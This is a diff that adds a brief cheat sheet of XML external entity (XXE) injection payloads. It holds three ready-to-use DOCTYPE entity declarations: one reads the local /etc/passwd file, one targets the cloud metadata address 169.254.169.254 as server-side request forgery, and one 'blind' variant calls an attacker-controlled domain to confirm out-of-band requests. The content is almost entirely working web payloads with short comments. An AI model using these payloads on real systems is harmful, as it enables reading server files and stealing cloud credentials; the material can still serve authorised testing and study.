@@ -1,0 +1,13 @@
+
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> // To view local files
+
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>   // xxe SSRF
+
+********************************************************************************************
+/*BLIND*/
+
+// Send request to a doamain owned by ourself to monitor for HTTP request.
+
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker-controlled-domain">  ]>
+
+
